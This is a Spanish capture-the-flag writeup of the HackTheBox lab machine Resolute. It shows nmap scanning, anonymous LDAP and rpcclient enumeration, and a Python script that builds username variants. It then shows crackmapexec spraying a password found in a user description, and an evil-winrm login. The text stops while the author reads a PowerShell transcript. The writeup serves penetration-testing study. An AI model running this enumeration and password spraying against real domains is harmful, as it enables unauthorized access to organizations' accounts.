---
layout      : post
title       : "HackTheBox - Resolute"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220banner.png
category    : [ htb ]
tags        : [ DLL, PSTranscript, LDAP, visual-studio, DnsAdmins, DC ]
---
Máquina Windows nivel medio. Enumeraremos hasta más no poder un **controlador de dominio**, veremos contraseñas volando libremente e inyectaremos una **DLL** maliciosa en un servidor **DNS** 😲

![220resoluteHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220resoluteHTB.png)

## TL;DR (Spanish writeup)

**Creada por**: [egre55](https://www.hackthebox.eu/profile/1190).

El dinamismo ante todooooooooooo0OoooO!

Nos enfrentaremos a un **DC** (controlador de dominio) to lindo, inicialmente enumeraremos el protocolo **LDAP**, con él conseguiremos bastante info de unos usuarios. Los recopilaremos para usarlos después.

Jugaremos con `rpcclient` para enumerar el dominio un poco más, encontraremos una contraseña en la descripción del usuario `marko`, pero validándolas contra el sistema u otro servicio no serán válidas. Tomaremos los usuarios que obtuvimos antes y probaremos con cada uno esa contraseña. Finalmente tendremos como candidato válido el usuario `Melanie`, jugando con `evil-winrm` obtendremos una **PowerShell** en el sistema como ella.

En un directorio del sistema encontraremos el log de unos comandos ejecutados en **PowerShell** (`PSTranscript`), con los ojos bien grandes veremos unas credenciales usadas por el usuario `Ryan` para intentar mapear unos directorios del sistema. Usaremos **evil-winrm** para obtener una nueva Shell.

Veremos que **Ryan** esta en el grupo `DnsAdmins`, jugaremos con ese grupo para explotar el servidor **DNS**, inyectaremos una `DDL` maliciosa que al ser ejecutada nos devuelva una **Reverse Shell** como el usuario `nt authority\system` (: 

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Mucho real!! Bastante enumerar y manos ensuciar e.e

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

HAY QUE VIVIR TODOS LOS DÍAS!

1. [Reconocimiento](#reconocimiento).
  * [Enumeración de puertos con nmap](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Recorremos el protocolo **LDAP**](#puertos-ldap).
3. [Explotación: encontramos usuarios en el servidor **LDAP**](#explotacion).
  * [Enumeramos un poquito más del **Domain Controller**](#rpcclient-dc).
4. [Nos movemos de **Melanie** a **Ryan** viendo archivos del sistema](#creds-pstranscript).
5. [Escalada de privilegios: explotamos el grupo **DnsAdmins**](#escalada-de-privilegios).
6. [**<u>Post-Explotación: Compilamos nuestra propia **DLL**</u>**](#manual-dll).
  * [Generamos la **DLL** usando **dns-exe-persistance**](#repo-dns-exe-persistance).
  * [Generamos la **DLL** usando **DNSAdmin-DLL**](#repo-dnsadmin-dll).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeración de puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Iniciaremos encontrando que puertos tiene activos y expuestos la máquina, para esto usaremos `nmap`:

```bash
❱ nmap -p- --open -v 10.10.10.169 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

El escaneo nos devuelve varios puertos:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Wed Aug 11 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.169
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.169 ()	Status: Up
Host: 10.10.10.169 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49670/open/tcp/////, 49676/open/tcp/////, 49677/open/tcp/////, 49688/open/tcp/////, 49712/open/tcp/////
# Nmap done at Wed Aug 11 25:25:25 2021 -- 1 IP address (1 host up) scanned in 126.37 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 53                | **[DNS](https://book.hacktricks.xyz/pentesting/pentesting-dns)**: Permite a internet identificar que dominio es de que IP y viceversa. |
| 88                | **[Kerberos](https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88)**: Protocolo de autenticación.  |
| 135/593           | **[RPC](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)**: Permite la comunicación entre computadores de distintas redes sin problemas. |
| 139/445           | **[SMB](https://www.varonis.com/blog/smb-port/)**: Podemos compartir información entre dispositivos de una red. |
| 389/636/3268/3269 | **[LDAP](https://book.hacktricks.xyz/pentesting/pentesting-ldap)**: Protocolo que ayuda a la localización de "recursos" en una red. |
| 464               | **[kpasswd5](https://security.stackexchange.com/questions/205492/what-is-this-service)**: Relacionado con el protocolo **kerberos**: `Kerberos Password Change`. |
| 5985/47001        | **[WinRM](https://www.pcwdld.com/what-is-winrm)**: Usado para ejecutar tareas administrativas de una red. |
| 9389              | **[ADWS](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-administrative-center)**: `Active Directory Administrative Center`. |
| 49664/49666       | No sabemos. |
| 49667/49670/49676 | No sabemos. |
| 49677/49688/49712 | Y no sabemos. |

Uff, varios puertos...

Ya teniendo conocimiento de los servicios que tiene activos la máquina, haremos otro escaneo, pero esta vez para descubrir que versiones y script están relacionados con cada servicio:

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.169
    [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49666,49667,49670,49676,49677,49688,49712

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49666,49667,49670,49676,49677,49688,49712 -sC -sV 10.10.10.169 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Obtenemos:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Wed Aug 11 25:25:25 2021 as: nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49666,49667,49670,49676,49677,49688,49712 -sC -sV -oN portScan 10.10.10.169
Nmap scan report for 10.10.10.169
Host is up (0.12s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-08-11 16:45:18Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
49712/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=8/11%Time=6113FBAF%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"...
SF:...x03");
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h32m36s, deviation: 4h02m31s, median: 12m35s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2021-08-11T09:46:12-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-11T16:46:13
|_  start_date: 2021-08-11T16:08:23

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 11 25:25:25 2021 -- 1 IP address (1 host up) scanned in 173.51 seconds
```

Peeeerfecto, destacamos:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 389    | LDAP     | LDAP |

  * Un dominio: `megabank.local`.

---

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 445    | SMB      | Windows Server 2016 Standard 14393 |

  * Vemos también el [grupo de trabajo](https://social.technet.microsoft.com/Forums/lync/es-ES/833097b4-30e4-4028-a59e-38d06c7024f5/para-que-sirve-un-grupo-de-trabajo?forum=win10itprogeneralES#11a41872-a3e7-4fa1-92af-291de8c17fda) `MEGABANK`.

Por el momento nada más, ahora si empecemos a romper de toooooooooodo 🕯️

...

# Enumeración [#](#enumeracion) {#enumeracion}

...

## Protocolo <u>LDAP</u> [📌](#puertos-ldap) {#puertos-ldap}

Después de probar y probar cositas hacia el **DNS** o hacia **SMB** no encontramos nada :(

Sin embargo si nos enfocamos en enumerar los recursos sostenidos por el protocolo `LDAP` vemos varias cositas interesantes...

📥 ***"`LDAP` son las siglas de **Protocolo Ligero de Acceso a Directorio**, o en inglés **Lightweight Directory Access Protocol**). Se trata de un conjunto de protocolos de licencia abierta que son utilizados para **acceder a la información que está almacenada de forma centralizada** en una red."*** [profesionalreview](https://www.profesionalreview.com/2019/01/05/ldap/).

Muy bien, apoyados en [esta guía](https://book.hacktricks.xyz/pentesting/pentesting-ldap) logramos profundizar y encontrar cadenas llamativas, empezaremos a jugar con un script de `nmap` que busca todos los recursos servidos por el protocolo y los muestra, se llama [ldap-search](https://nmap.org/nsedoc/scripts/ldap-search.html):

```bash
❱ nmap -p 389 --script "ldap-search" 10.10.10.169 -oN ldapSearch
```

Nos devuelve un gran output, pero ya en las primeras líneas podemos extraer info para seguir jugando:

```bash
# Nmap 7.80 scan initiated Wed Aug 11 25:25:25 2021 as: nmap -p 389 --script ldap-search -oN ldapSearch 10.10.10.169
Nmap scan report for 10.10.10.169
Host is up (0.11s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: DC=megabank,DC=local
|     dn: DC=megabank,DC=local
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=megabank,DC=local
...
...
...
```

Volvemos a ver el dominio de antes (`megabank.local`) pero separado, lo que realmente tenemos ahí es el *componente del dominio* (`DC`), que sería el objeto que toma el **DNS** como referencia para definir un "nombre de espacio" (como un "identificador").

Esto nos sirve para jugar a enumerar ese **DC**, ya sea con la herramienta `ldapsearch` o (hay más de 2 opciones claramente) con una librería de **Python** llamada `ldap3`. 

Empecemos con `ldapsearch` y después hacemos unos truquitos bonitos con **Python** y su librería `ldap3`.

```bash
❱ ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local"
```

| Parámetro | Descripción |
| --------- | :---------- |
| -h        | Le pasamos el servidor donde esta el protocolo **LDAP** |
| -x        | Hacemos una autenticación simple, sin contraseña        |
| -b        | Le indicamos cuál es la base de nuestra búsqueda        |

Al ejecutarlo vemos el output que obtuvimos con `nmap` peeeeeeero muchas cosas más. Y descubrimos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_ldapsearch_foundUsers.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Vemos al final varios usuarios, les muestro a `Simon` porque fue el primero que vi, pero hay unos cuantos, si detallamos la imagen hay dos líneas interesantes:

* El `Common Name (CN)` contiene el nombre y apellido del usuario en el formato `Nombre Apellido` (nótese las mayus).
* En el campo `userPrincipalName` esta el correo relacionado con ese usuario, pero también podemos destacar su formato: `nombre@megabank.local`.

Esto es supremamente llamativo, ya que de una enumeración de recursos del servidor `LDAP` hemos encontrado usuarios relacionados con el **Domain Controller** `megabank.local` 🔥

* Pa leer - [Términos extraños (CN, DC, DN, etc.) : Understanding Active Directory Services](https://www.informit.com/articles/article.aspx?p=101405&seqNum=7).

Pues si volvemos a ejecutar la instrucción, pero filtrando con **grep** por `cn:` (si no sabes por qué, vuelve a la imagen de arriba) para ver únicamente el nombre completo del usuario, nos damos cuenta de que la lista empieza con el usuario `Ryan`:

```bash
❱ ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local" | grep "cn:"
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_ldapsearch_grepCN1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Po muy bien, lo que podemos hacer ahora es filtrar desde `Ryan` hasta (por ejemplo) 30 líneas después:

```bash
❱ ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local" | grep "cn:" | grep "Ryan" -A 30
cn: Ryan Bertrand
cn: Marko Novak
...
```

Ya tendríamos los usuarios, quitémosle el `cn:` y guardémoslos en un archivo:

```bash
# Separamos la cadena por sus espacios y nos quedamos con la segunda posicion en adelante (`2-`)
❱ ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local" | grep "cn:" | grep "Ryan" -A 30 | cut -d " " -f2-
```

```bash
❱ ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local" | grep "cn:" | grep "Ryan" -A 30 | cut -d " " -f2- > users.txt 
❱ cat users.txt | wc -l
23
```

Hay **23** usuarios, antes de ponernos a probar fuerza bruta o cualquier otra cosa es muy importante interpretar en que entorno estamos. 

Si nos hemos dado cuenta estamos dentro de un **directorio activo (Active Directory o AD)**, que de una manera muuuuuuuy resumida ayuda a administrar políticas, credenciales, equipos y otras cositas de toooda la red.

* [Más info AD - Active Directory Que es y para qué sirve](https://www.profesionalreview.com/2018/12/15/active-directory/).

Algo llamativo de los usuarios que existen en un **AD** son el formato en que son guardados (depende claramente de la empresa que gestiona ese AD).

Tomaremos de ejemplo el usuario `Carlos Carlitos` y el dominio `nanai`: nos podemos encontrar varios "templates":

(*Imagina con mayus también*)

* `c.carlitos@nanai`.
* `ccarlitos@nanai`.
* `Carlos@nanai`.
* `CarlosCarlitos@nanai`.

Y bueno, las demás formas que te puedas imaginar, esas serian las más conocidas y usadas. Pero, ¿de qué nos sirve esto? Bueno, muy sencillo, si en dado caso de probar el usuario `carlos` con tooooooodas las contraseñas posibles, pueda que ninguna nos dé resultado, ¿pero nos frenamos? Pues no, jugamos por ejemplo con un usuario llamado `ccarlitos` o `CarlosCarlitos` o bueno ya me entiendes :P el estar en un entorno como **AD** nos abre la puerta a más pruebas, ahora si sigamos...

Veamos rápidamente como obtener los mismos usuarios pero con la librería de `ldap3` en **Python3**:

* [Basic Enumeration LDAP with <u>import ldap3</u>](https://book.hacktricks.xyz/pentesting/pentesting-ldap#manual).

Creamos el script:

```py
#!/usr/bin/python3

import ldap3

# Nos conectamos al servidor LDAP
server = ldap3.Server('10.10.10.169', get_info = ldap3.ALL, port = 389, use_ssl = False)
connection = ldap3.Connection(server)
connection.bind()

# Buscamos en el Domain Controller y filtramos por los objetos "persona" con atributos Common Name
connection.search(search_base='DC=megabank,DC=local', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='CN')

# Obtenemos un array como respuesta
print(connection.entries)
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_scriptPY_connectLDAP_users.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones, ya tendríamos los usuarios, esto nos permite jugar de toooooooooodas las formas posibles con ellos desde el mismo **programa**, nuestro script final con únicamente los usuarios sería este:

```py
#!/usr/bin/python3

import ldap3
import re

server = ldap3.Server('10.10.10.169', get_info = ldap3.ALL, port = 389, use_ssl = False)
connection = ldap3.Connection(server)
connection.bind()

connection.search(search_base='DC=megabank,DC=local', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='CN')

# Volvemos a extraer toda la data despues del `cn:` (texto que este entre varios rangos: de la 'A' a la 'Z', de la 'a' a la 'z', del '0' al '9' y espacios en blanco.
users_array = re.findall(r'cn: [A-Za-z0-9\s].+', str(connection.entries))
print(users_array)
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_scriptPY_connectLDAP_arrayUsers.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ahora nos queda jugar con ese array y generar infinidad de usuarios.

▶️ ***[Lindo tutorial de expresiones regulares](https://github.com/ziishaned/learn-regex/blob/master/translations/README-es.md)***.

...

# Explotación [#](#explotacion) {#explotacion}

Con ayuda de la librería `ldap3` en **Python** y nuestra extracción de usuarios podemos crear un bucle primero para quitar `cn:` de cada usuario y segundo para armar el formato que queramos con respecto a cada user, este sería el resultado final de nuestro script:

```py
#!/usr/bin/python3

import ldap3
import re

server = ldap3.Server('10.10.10.169', get_info = ldap3.ALL, port = 389, use_ssl = False)
connection = ldap3.Connection(server)
connection.bind()

connection.search(search_base='DC=megabank,DC=local', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='CN')

users_array = re.findall(r'cn: [A-Za-z0-9\s].+', str(connection.entries))

# Creamos archivo vacio llamado `users.txt`
file_users = open("users.txt", "w")
for user_with_cn in users_array:
    user = user_with_cn.replace("cn: ","")

    # Ejemplo: Ryan Bertrand
    try:
        # Ryan
        firstname = user.split()[0]
        # Bertrand
        lastname = user.split()[1]

        # -- Abrimos archivo para adjuntar data, no para sobreescribirla
        file_users = open("users.txt", "a")

        # Ryan
        file_users.write(firstname + "\n")
        # ryan.bertrand
        file_users.write(firstname.lower() + "." + lastname.lower() + "\n")
        # Ryan.Bertrand
        file_users.write(firstname + "." + lastname + "\n")
        # Ryan@Bertrand
        file_users.write(firstname + "@" + lastname + "\n")
        # RyanBertrand
        file_users.write(firstname + lastname + "\n")
        # R.bertrand
        file_users.write(firstname[0] + "." + lastname.lower() + "\n")
        # Rbertrand
        file_users.write(firstname[0] + lastname.lower() + "\n")
        # r.bertrand
        file_users.write(firstname.lower()[0] + "." + lastname.lower() + "\n")
        # rbertrand
        file_users.write(firstname.lower()[0] + lastname.lower() + "\n")

    except:
        pass

file_users.close()
```

Y en nuestro archivo `users.txt` veríamos algo así con todos los usuarios:

```bash
❱ cat users.txt
...
Marcus
marcus.strong
Marcus.Strong
Marcus@Strong
MarcusStrong
M.strong
Mstrong
m.strong
mstrong
...
```

Perfectísimo, tendríamos varias opciones de usuarios, solo nos faltaría la contraseña, podemos probar varias cosas, inicialmente algo como que cada **usuario** tome su "user" como contraseña (no se sabe, la vida es muy loca :P):

Nos apoyaremos en `crackmapexec` que puede validar rápidamente contra **SMB** si unas credenciales son válidas o no:

```bash
❱ crackmapexec smb 10.10.10.169 -u users.txt -p users.txt
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:Ryan STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:ryan.bertrand STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:Ryan.Bertrand STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:Ryan@Bertrand STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:RyanBertrand STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:R.bertrand STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:Rbertrand STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:r.bertrand STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:rbertrand STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:Marko STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:marko.novak STATUS_LOGON_FAILURE
...
```

Pero nada, ninguna es valida 😔

---

## Enumeramos con <u>rpcclient</u> el <u>Domain Controller</u> [📌](#rpcclient-dc) {#rpcclient-dc}

Después de agotar pruebas volvi al escaneo de puertos y recordé a `rpcclient`, herramienta que nos ayuda a rescatar más info del controlador de dominio (en caso de no necesitar credenciales 🙃), su uso es sencillo:

```bash
❱ rpcclient 10.10.10.169 -U "" -N
rpcclient $>
```

Perfecto, nos dejó entrar sin credenciales, ahora es ver si hay algo para enumerar...

Intentando ver los usuarios del dominio obtenemos info, lo único que cambia con respecto a los que tenemos son los primeros:

```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
...
```

Si nos fijamos también nos muestra un campo llamado `rid` que seria como un identificador para ese usuario, este nos sirve entre varias cosas para listar más info acerca del user, como por ejemplo con `Administrator`:

```bash
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      mié, 11 ago 2021 11:09:43 -05
        Logoff Time              :      mié, 31 dic 1969 19:00:00 -05
        Kickoff Time             :      mié, 31 dic 1969 19:00:00 -05
        Password last set Time   :      jue, 12 ago 2021 09:46:03 -05
        Password can change Time :      vie, 13 ago 2021 09:46:03 -05
        Password must change Time:      mié, 13 sep 30828 21:48:05 -05
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000003e
        padding1[0..7]...
        logon_hrs[0..21]...
```

Obtenemos eso, una información más detallada del usuario, podríamos hacer a mano esto con todos los demás usuarios, pero es un poco feo, lo mejor es automatizarlo, hagámoslo rápidamente con ayuda de la terminal, lo primero es extraer todos los `rids`:

Con el parámetro `-c` le indicamos que ejecute un comando y no nos devuelva una sesión interactiva:

```bash
❱ rpcclient 10.10.10.169 -U "" -N -c 'enumdomusers'
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
...
```

Ahora filtramos por el `rid`:

```bash
❱ rpcclient 10.10.10.169 -U "" -N -c 'enumdomusers' | grep -oP "rid.+"
rid:[0x1f4]
rid:[0x1f5]
...
```

Separamos la cadena en dos delimitndola por el simbolo `:` y nos quedamos con el segundo valor:

```bash
❱ rpcclient 10.10.10.169 -U "" -N -c 'enumdomusers' | grep -oP "rid.+" | cut -d ':' -f 2
[0x1f4]
[0x1f5]
...
```

Y simplemente quitamos los `[]` de la cadena:

```bash
❱ rpcclient 10.10.10.169 -U "" -N -c 'enumdomusers' | grep -oP "rid.+" | cut -d ':' -f 2 | tr -d '[]'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_rpcclientGREP_rids.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones, al final le agregamos un archivo donde queremos guardar esos valores (`... > rids.txt`) y ya tenemos los `rids` (: 

Ahora volvemos a usar `rpcclient`, pero con el comando `queryuser` y le vamos pasando los `rids` del archivo, primero hagamos una prueba con el usuario `Administrator`, ya vimos todos los campos que nos devuelve al ejecutar el comando, quedémonos con el nombre del usuario y su descripción, ningún otro campo se ve llamativo así que juguemos con esos dos:

```bash
❱ rpcclient 10.10.10.169 -U "" -N -c 'queryuser 0x1f4' -N | grep -E "User Name|Description"
        User Name   :   Administrator
        Description :   Built-in account for administering the computer/domain
```

```bash
❱ rpcclient 10.10.10.169 -U "" -N -c 'queryuser 0x1f4' -N | grep -E "User Name|Description" | cut -d ":" -f2-
        Administrator
        Built-in account for administering the computer/domain
```

```bash
❱ rpcclient 10.10.10.169 -U "" -N -c 'queryuser 0x1f4' -N | grep -E "User Name|Description" | cut -d ":" -f2- | sed -e 's/^[[:space:]]*//'
Administrator
Built-in account for administering the computer/domain
```

Listo, ya tenemos nuestro output deseado, juguemos con un bucle que lea cada línea del archivo y realice el mismo procedimiento pero con todos los usuarios:

```bash
❱ for i in $(cat rids.txt); do echo "-----------"; rpcclient 10.10.10.169 -U "" -N -c "queryuser $i" -N | grep -E "User Name|Description" | cut -d ":" -f2- | sed -e 's/^[[:space:]]*//'; done
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_forloop_rpcclient_foundPW.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

¿Ya viste algo? 😵 Efectivamente, hay una contraseña seteada para el usuario `marko` :O :o O.O Puuuuuuuuuuuess probando de nuevo con `cme`, pero ahora contra "`marko`" no nos dan resultado esas credenciales :(

```bash
❱ crackmapexec smb 10.10.10.169 -u 'marko' -p 'Welcome123!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
```

Probando contra los demás servicios no es válida tampoco :( peeeeeeeeeeero no nos rendimos, si recordamos habíamos creado una lista de usuarios muy linda, pues volvamos a probar con cada usuario del objeto pero ahora contra esa contraseña:

```bash
❱ crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!'
...
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_cme_MelaniePWvalid.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OPAAAAAAAAAAAAAAAAAAAAA, `crackmapexec` nos indica que esa contraseña es válida contra el usuario `Melanie`. 

Recordemos que existe el servicio `WinRM` (que nos permite jugar con tareas administrativas) y para él hay una herramienta muy linda llamada [evil-winrm](https://github.com/Hackplayers/evil-winrm), ella nos permite obtener una **PowerShell** en el sistema siempre y cuando tengamos credenciales válidas, intentemos usarla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_evilWinRM_melanieSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

VAMOOOOOOOOOOOOO, tamos dentroooooooooooowowowowoiqwjrasdkfjkalñd

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220google_gif_patricioOH.gif" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>

s1g4m0s...

...

# Movimiento lateral : Melanie -> Ryan [#](#creds-pstranscript) {#creds-pstranscript}

Recorriendo algunas carpetas del sistema vemos una oculta en la raíz: `PSTranscripts`:

```powershell
*Evil-WinRM* PS C:\> ls -force

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
...
d--h--        12/3/2019   6:32 AM                PSTranscripts
...
```

Su nombre es llamativo, ya que habla de scripts, entremos y veamos que hay:

```powershell
*Evil-WinRM* PS C:\PSTranscripts> ls -force -recurse

    Directory: C:\PSTranscripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203

    Directory: C:\PSTranscripts\20191203

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

Un directorio `20191203` y dentro un objeto `.txt`, veamos ese archivo:

```powershell
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
...
...
**********************
Command start time: 20191203063515
**********************
